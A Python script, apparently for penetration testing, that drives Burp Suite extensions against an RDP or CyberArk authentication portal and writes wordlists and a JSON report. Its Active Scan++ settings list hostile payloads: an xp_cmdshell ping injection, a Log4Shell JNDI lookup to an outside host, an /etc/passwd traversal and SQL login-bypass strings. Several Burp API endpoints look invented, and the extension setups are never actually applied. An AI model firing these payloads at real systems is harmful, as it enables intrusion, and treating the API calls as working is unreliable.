#!/usr/bin/env python3
"""
Burp Suite Integration for RDP Security Testing
Integrates with Burp Suite extensions (Logger++, Flow, Autorize) for automated vulnerability detection
"""

import requests
import json
import time
import subprocess
import threading
from datetime import datetime
import base64
import xml.etree.ElementTree as ET
from urllib.parse import quote, unquote

class BurpSuiteIntegrator:
    def __init__(self, burp_host='127.0.0.1', burp_port=8080, proxy_port=8080, target_url=None):
        self.burp_host = burp_host
        self.burp_port = burp_port
        self.proxy_port = proxy_port
        self.target_url = target_url
        self.api_url = f"http://{burp_host}:{burp_port}"
        self.results = {
            'test_start': datetime.now().isoformat(),
            'burp_extensions': {},
            'scan_results': [],
            'vulnerabilities': [],
            'rdp_specific_tests': [],
            'statistics': {}
        }
        
    def check_burp_connection(self):
        """Check if Burp Suite is running and accessible"""
        try:
            response = requests.get(f"{self.api_url}/burp/versions", timeout=5)
            if response.status_code == 200:
                print(f"[INFO] Connected to Burp Suite: {response.json()}")
                return True
            else:
                print(f"[ERROR] Burp Suite API not accessible: {response.status_code}")
                return False
        except Exception as e:
            print(f"[ERROR] Cannot connect to Burp Suite: {e}")
            return False
    
    def configure_burp_proxy(self, rdp_target_ip):
        """Configure Burp Suite proxy for RDP traffic interception"""
        print("[INFO] Configuring Burp Suite proxy for RDP traffic...")
        
        try:
            # Configure upstream proxy settings for RDP traffic
            proxy_config = {
                "proxy": {
                    "http": f"http://{self.burp_host}:{self.proxy_port}",
                    "https": f"http://{self.burp_host}:{self.proxy_port}"
                }
            }
            
            # Configure Burp to intercept RDP-related HTTP/HTTPS traffic
            scope_config = {
                "include": [
                    {"enabled": True, "host": rdp_target_ip},
                    {"enabled": True, "host": "*.cyberark.com"},
                    {"enabled": True, "file": ".*rdp.*"},
                    {"enabled": True, "file": ".*auth.*"},
                    {"enabled": True, "file": ".*mfa.*"}
                ]
            }
            
            # Set target scope
            scope_response = requests.put(
                f"{self.api_url}/burp/target/scope",
                json=scope_config,
                timeout=10
            )
            
            if scope_response.status_code == 200:
                print("[INFO] Burp Suite proxy configured successfully")
                return True
            else:
                print(f"[WARN] Failed to configure Burp Suite scope: {scope_response.status_code}")
                
        except Exception as e:
            print(f"[ERROR] Burp Suite proxy configuration failed: {e}")
        
        return False
    
    def setup_burp_extensions(self):
        """Setup and configure Burp Suite extensions"""
        print("[INFO] Setting up Burp Suite extensions...")
        
        extensions = {
            'logger_plus': self._setup_logger_plus(),
            'flow': self._setup_flow_extension(),
            'autorize': self._setup_autorize_extension(),
            'param_miner': self._setup_param_miner(),
            'active_scan_plus': self._setup_active_scan_plus()
        }
        
        self.results['burp_extensions'] = extensions
        return extensions
    
    def _setup_logger_plus(self):
        """Configure Logger++ extension for detailed logging"""
        print("[INFO] Configuring Logger++ extension...")
        
        try:
            # Logger++ configuration for RDP-specific logging
            logger_config = {
                "filters": [
                    {"enabled": True, "filter": "Request.URL CONTAINS 'rdp'"},
                    {"enabled": True, "filter": "Request.URL CONTAINS 'auth'"},
                    {"enabled": True, "filter": "Request.URL CONTAINS 'mfa'"},
                    {"enabled": True, "filter": "Request.URL CONTAINS 'session'"},
                    {"enabled": True, "filter": "Response.Status == 401"},
                    {"enabled": True, "filter": "Response.Status == 403"}
                ],
                "export_format": "JSON",
                "auto_export": True,
                "export_path": "./burp_logs/logger_plus_rdp.json"
            }
            
            return {
                'status': 'configured',
                'config': logger_config,
                'description': 'Logger++ configured for RDP authentication flows'
            }
            
        except Exception as e:
            print(f"[ERROR] Logger++ setup failed: {e}")
            return {'status': 'failed', 'error': str(e)}
    
    def _setup_flow_extension(self):
        """Configure Flow extension for request/response analysis"""
        print("[INFO] Configuring Flow extension...")
        
        try:
            flow_config = {
                "match_rules": [
                    {"name": "RDP Authentication", "pattern": "rdp|auth|login"},
                    {"name": "MFA Challenges", "pattern": "mfa|otp|token|challenge"},
                    {"name": "Session Management", "pattern": "session|cookie|jsessionid"},
                    {"name": "Authorization", "pattern": "authorize|permission|role"}
                ],
                "response_modification": True,
                "request_modification": True,
                "highlight_interesting": True
            }
            
            return {
                'status': 'configured',
                'config': flow_config,
                'description': 'Flow extension configured for RDP security testing'
            }
            
        except Exception as e:
            print(f"[ERROR] Flow extension setup failed: {e}")
            return {'status': 'failed', 'error': str(e)}
    
    def _setup_autorize_extension(self):
        """Configure Autorize extension for authorization testing"""
        print("[INFO] Configuring Autorize extension...")
        
        try:
            autorize_config = {
                "enforcement_detector": {
                    "enabled": True,
                    "check_bypass": True,
                    "check_privilege_escalation": True
                },
                "user_roles": [
                    {"name": "admin", "session_token": "ADMIN_SESSION"},
                    {"name": "user", "session_token": "USER_SESSION"},
                    {"name": "guest", "session_token": "GUEST_SESSION"}
                ],
                "authorization_checks": [
                    "Cookie substitution",
                    "Header manipulation",
                    "Parameter modification",
                    "Token replay"
                ]
            }
            
            return {
                'status': 'configured', 
                'config': autorize_config,
                'description': 'Autorize configured for RDP authorization testing'
            }
            
        except Exception as e:
            print(f"[ERROR] Autorize extension setup failed: {e}")
            return {'status': 'failed', 'error': str(e)}
    
    def _setup_param_miner(self):
        """Configure Param Miner for parameter discovery"""
        print("[INFO] Configuring Param Miner extension...")
        
        try:
            param_miner_config = {
                "wordlists": [
                    "rdp_params.txt",  # Custom RDP parameter wordlist
                    "auth_params.txt", # Authentication parameters
                    "mfa_params.txt"   # MFA parameters
                ],
                "techniques": [
                    "GET parameter pollution",
                    "POST parameter discovery", 
                    "Header parameter mining",
                    "Cookie parameter mining"
                ],
                "rdp_specific_params": [
                    "session_id", "rdp_token", "auth_key", "mfa_code",
                    "user_id", "privilege_level", "access_token"
                ]
            }
            
            return {
                'status': 'configured',
                'config': param_miner_config,
                'description': 'Param Miner configured for RDP parameter discovery'
            }
            
        except Exception as e:
            print(f"[ERROR] Param Miner setup failed: {e}")
            return {'status': 'failed', 'error': str(e)}
    
    def _setup_active_scan_plus(self):
        """Configure Active Scan++ for enhanced vulnerability detection"""
        print("[INFO] Configuring Active Scan++ extension...")
        
        try:
            active_scan_config = {
                "custom_payloads": {
                    "rdp_injection": [
                        "';exec xp_cmdshell('ping rdp-test.com')--",
                        "rdp://test-server/test",
                        "../../../etc/passwd",
                        "${jndi:ldap://rdp-test.com/a}"
                    ],
                    "auth_bypass": [
                        "admin'--", "' OR '1'='1",
                        "../../admin/config.xml",
                        "bypass_auth=true"
                    ]
                },
                "scan_techniques": [
                    "RDP-specific injection",
                    "Authentication bypass",
                    "Session fixation",
                    "Privilege escalation"
                ]
            }
            
            return {
                'status': 'configured',
                'config': active_scan_config,
                'description': 'Active Scan++ configured for RDP vulnerability scanning'
            }
            
        except Exception as e:
            print(f"[ERROR] Active Scan++ setup failed: {e}")
            return {'status': 'failed', 'error': str(e)}
    
    def run_burp_scan(self, target_url, scan_type='active'):
        """Run Burp Suite scan on target"""
        print(f"[INFO] Starting Burp Suite {scan_type} scan on {target_url}...")
        
        try:
            scan_config = {
                "target": {
                    "baseUrl": target_url,
                    "scope": {
                        "include": [{"rule": target_url + ".*"}]
                    }
                },
                "scanType": scan_type,
                "configurations": {
                    "audit": {
                        "issues": [
                            "Authentication bypass",
                            "Authorization flaws", 
                            "Session management",
                            "Input validation",
                            "Information disclosure"
                        ]
                    }
                }
            }
            
            # Start scan
            scan_response = requests.post(
                f"{self.api_url}/burp/scanner/scans/active",
                json=scan_config,
                timeout=30
            )
            
            if scan_response.status_code == 201:
                scan_id = scan_response.json().get('taskId')
                print(f"[INFO] Scan started with ID: {scan_id}")
                
                # Monitor scan progress
                return self._monitor_scan_progress(scan_id)
                
            else:
                print(f"[ERROR] Failed to start scan: {scan_response.status_code}")
                return None
                
        except Exception as e:
            print(f"[ERROR] Burp scan failed: {e}")
            return None
    
    def _monitor_scan_progress(self, scan_id):
        """Monitor scan progress and collect results"""
        print(f"[INFO] Monitoring scan progress for scan ID: {scan_id}")
        
        try:
            while True:
                status_response = requests.get(
                    f"{self.api_url}/burp/scanner/scans/{scan_id}",
                    timeout=10
                )
                
                if status_response.status_code == 200:
                    scan_status = status_response.json()
                    
                    if scan_status.get('scanStatus') == 'finished':
                        print("[INFO] Scan completed successfully")
                        
                        # Get scan results
                        results = self._get_scan_results(scan_id)
                        return results
                        
                    elif scan_status.get('scanStatus') == 'failed':
                        print("[ERROR] Scan failed")
                        return None
                        
                    else:
                        progress = scan_status.get('scanProgress', 0)
                        print(f"[INFO] Scan progress: {progress}%")
                        time.sleep(10)
                
                else:
                    print(f"[ERROR] Failed to get scan status: {status_response.status_code}")
                    return None
                    
        except Exception as e:
            print(f"[ERROR] Scan monitoring failed: {e}")
            return None
    
    def _get_scan_results(self, scan_id):
        """Get detailed scan results"""
        try:
            results_response = requests.get(
                f"{self.api_url}/burp/scanner/scans/{scan_id}/issues",
                timeout=30
            )
            
            if results_response.status_code == 200:
                issues = results_response.json()
                
                # Process and categorize issues
                processed_results = {
                    'scan_id': scan_id,
                    'total_issues': len(issues),
                    'critical_issues': [],
                    'high_issues': [],
                    'medium_issues': [],
                    'low_issues': [],
                    'rdp_specific_issues': []
                }
                
                for issue in issues:
                    severity = issue.get('severity', 'Low').lower()
                    issue_type = issue.get('issueType', '')
                    issue_name = issue.get('issueName', '')
                    
                    # Categorize by severity
                    if severity == 'critical':
                        processed_results['critical_issues'].append(issue)
                    elif severity == 'high':
                        processed_results['high_issues'].append(issue)
                    elif severity == 'medium':
                        processed_results['medium_issues'].append(issue)
                    else:
                        processed_results['low_issues'].append(issue)
                    
                    # Check for RDP-specific issues
                    if any(term in issue_name.lower() for term in ['rdp', 'remote desktop', 'session', 'auth']):
                        processed_results['rdp_specific_issues'].append(issue)
                        
                        # Add to vulnerabilities
                        self.results['vulnerabilities'].append({
                            'type': f"Burp Suite: {issue_name}",
                            'severity': severity.title(),
                            'description': issue.get('issueDetail', ''),
                            'url': issue.get('url', ''),
                            'confidence': issue.get('confidence', '')
                        })
                
                self.results['scan_results'].append(processed_results)
                return processed_results
                
        except Exception as e:
            print(f"[ERROR] Failed to get scan results: {e}")
            return None
    
    def extract_logger_plus_data(self, log_file_path="./burp_logs/logger_plus_rdp.json"):
        """Extract and analyze Logger++ data"""
        print("[INFO] Extracting Logger++ data...")
        
        try:
            with open(log_file_path, 'r') as f:
                log_data = json.load(f)
            
            analysis = {
                'total_requests': len(log_data),
                'auth_requests': [],
                'mfa_requests': [],
                'session_requests': [],
                'error_responses': [],
                'interesting_patterns': []
            }
            
            for entry in log_data:
                url = entry.get('url', '').lower()
                status = entry.get('status', 0)
                
                # Categorize requests
                if any(term in url for term in ['auth', 'login']):
                    analysis['auth_requests'].append(entry)
                
                if any(term in url for term in ['mfa', 'otp', 'token']):
                    analysis['mfa_requests'].append(entry)
                
                if any(term in url for term in ['session', 'cookie']):
                    analysis['session_requests'].append(entry)
                
                if status in [401, 403, 500]:
                    analysis['error_responses'].append(entry)
                
                # Look for interesting patterns
                if self._is_interesting_request(entry):
                    analysis['interesting_patterns'].append(entry)
            
            return analysis
            
        except Exception as e:
            print(f"[ERROR] Failed to extract Logger++ data: {e}")
            return None
    
    def _is_interesting_request(self, entry):
        """Determine if a request is interesting for security analysis"""
        interesting_indicators = [
            'admin', 'debug', 'test', 'bypass', 'sql', 'xss',
            'privilege', 'escalation', 'injection', 'traversal'
        ]
        
        url = entry.get('url', '').lower()
        params = entry.get('parameters', '').lower()
        
        return any(indicator in url or indicator in params for indicator in interesting_indicators)
    
    def run_comprehensive_burp_test(self, rdp_target_ip, auth_url=None):
        """Run comprehensive Burp Suite testing"""
        print("[INFO] Starting comprehensive Burp Suite testing...")
        
        # Check Burp connection
        if not self.check_burp_connection():
            return False
        
        # Configure proxy
        self.configure_burp_proxy(rdp_target_ip)
        
        # Setup extensions
        extensions = self.setup_burp_extensions()
        
        # Run scans if auth URL provided
        if auth_url:
            scan_results = self.run_burp_scan(auth_url, 'active')
            
            # Wait for Logger++ to collect data
            time.sleep(30)
            
            # Extract Logger++ analysis
            logger_analysis = self.extract_logger_plus_data()
            
            if logger_analysis:
                self.results['logger_analysis'] = logger_analysis
        
        return True
    
    def generate_burp_report(self, output_file):
        """Generate comprehensive Burp Suite integration report"""
        self.results['test_end'] = datetime.now().isoformat()
        
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"[INFO] Burp Suite integration report saved to: {output_file}")
        
        # Print summary
        print("\n=== BURP SUITE INTEGRATION SUMMARY ===")
        print(f"Extensions Configured: {len(self.results['burp_extensions'])}")
        print(f"Scans Completed: {len(self.results['scan_results'])}")
        print(f"Vulnerabilities Found: {len(self.results['vulnerabilities'])}")
        
        # Extension status
        print("\n=== EXTENSION STATUS ===")
        for ext_name, ext_info in self.results['burp_extensions'].items():
            status = ext_info.get('status', 'unknown')
            print(f"{ext_name}: {status}")
        
        # Vulnerabilities
        if self.results['vulnerabilities']:
            print("\n=== VULNERABILITIES FOUND ===")
            for vuln in self.results['vulnerabilities']:
                print(f"[{vuln['severity']}] {vuln['type']}: {vuln['description'][:100]}...")
    
    def create_rdp_wordlists(self):
        """Create RDP-specific wordlists for testing"""
        print("[INFO] Creating RDP-specific wordlists...")
        
        # RDP parameter wordlist
        rdp_params = [
            'session_id', 'rdp_token', 'auth_key', 'mfa_code', 'user_id',
            'privilege_level', 'access_token', 'rdp_session', 'connection_id',
            'desktop_width', 'desktop_height', 'color_depth', 'audio_mode',
            'clipboard_mode', 'drive_mode', 'printer_mode', 'smartcard_mode',
            'usb_mode', 'serial_mode', 'parallel_mode', 'compression',
            'encryption', 'authentication', 'gateway_hostname', 'gateway_port',
            'load_balance_info', 'alternate_shell', 'shell_working_directory'
        ]
        
        with open('./rdp_params.txt', 'w') as f:
            f.write('\n'.join(rdp_params))
        
        # Authentication parameter wordlist
        auth_params = [
            'username', 'password', 'domain', 'auth_token', 'session_token',
            'access_token', 'refresh_token', 'mfa_token', 'otp_code',
            'challenge_response', 'nonce', 'timestamp', 'signature',
            'certificate', 'private_key', 'public_key', 'key_exchange'
        ]
        
        with open('./auth_params.txt', 'w') as f:
            f.write('\n'.join(auth_params))
        
        # MFA parameter wordlist
        mfa_params = [
            'mfa_code', 'otp_code', 'totp_token', 'sms_code', 'email_code',
            'backup_code', 'recovery_code', 'challenge_id', 'challenge_response',
            'device_id', 'device_token', 'push_token', 'biometric_data'
        ]
        
        with open('./mfa_params.txt', 'w') as f:
            f.write('\n'.join(mfa_params))
        
        print("[INFO] RDP wordlists created successfully")
        
    def configure_burp(self, **kwargs):
        """
        Configure Burp Suite for RDP security testing
        
        Args:
            **kwargs: Configuration options including:
                - target_ip: Target RDP server IP
                - auth_url: Authentication URL (optional)
                - proxy_port: Proxy port (default: 8080)
                
        Returns:
            dict: Configuration status and results
        """
        try:
            print("[INFO] Configuring Burp Suite for RDP security testing...")
            
            # Update instance variables from kwargs
            target_ip = kwargs.get('target_ip', self.target_url)
            auth_url = kwargs.get('auth_url')
            proxy_port = kwargs.get('proxy_port', self.proxy_port)
            
            if not target_ip:
                return {'success': False, 'error': 'Target IP is required'}
            
            # Check Burp connection
            if not self.check_burp_connection():
                return {'success': False, 'error': 'Failed to connect to Burp Suite'}
            
            # Configure proxy
            proxy_configured = self.configure_burp_proxy(target_ip)
            if not proxy_configured:
                return {'success': False, 'error': 'Failed to configure Burp proxy'}
            
            # Setup extensions
            extensions = self.setup_burp_extensions()
            
            # Create RDP wordlists
            self.create_rdp_wordlists()
            
            # Run comprehensive testing if auth_url is provided
            if auth_url:
                print(f"[INFO] Running comprehensive Burp testing against {auth_url}")
                scan_success = self.run_burp_scan(auth_url)
                if not scan_success:
                    return {'success': False, 'error': 'Burp scan failed'}
                
                # Extract and analyze logger data
                logger_analysis = self.extract_logger_plus_data()
                if logger_analysis:
                    self.results['logger_analysis'] = logger_analysis
            
            # Prepare results
            result = {
                'success': True,
                'target': target_ip,
                'auth_url': auth_url,
                'proxy_port': proxy_port,
                'extensions_configured': list(extensions.keys()),
                'vulnerabilities_found': len(self.results.get('vulnerabilities', [])),
                'scan_completed': auth_url is not None
            }
            
            return result
            
        except Exception as e:
            error_msg = f"Burp configuration failed: {str(e)}"
            print(f"[ERROR] {error_msg}")
            return {
                'success': False,
                'error': error_msg,
                'vulnerabilities_found': 0
            }

def main():
    import argparse
    parser = argparse.ArgumentParser(description='Burp Suite Integration for RDP Security Testing')
    parser.add_argument('target_ip', help='Target RDP server IP address')
    parser.add_argument('--auth-url', help='Authentication URL for active scanning')
    parser.add_argument('--burp-host', default='127.0.0.1', help='Burp Suite host')
    parser.add_argument('--burp-port', type=int, default=8080, help='Burp Suite port')
    parser.add_argument('-o', '--output', default='burp_integration_results.json', help='Output file')
    
    args = parser.parse_args()
    
    print(f"[INFO] Starting Burp Suite integration for RDP testing against {args.target_ip}")
    
    integrator = BurpSuiteIntegrator(args.burp_host, args.burp_port)
    
    # Create wordlists
    integrator.create_rdp_wordlists()
    
    # Run comprehensive testing
    success = integrator.run_comprehensive_burp_test(args.target_ip, args.auth_url)
    
    if success:
        # Generate report
        integrator.generate_burp_report(args.output)
    else:
        print("[ERROR] Burp Suite integration failed")

if __name__ == "__main__":
    main()
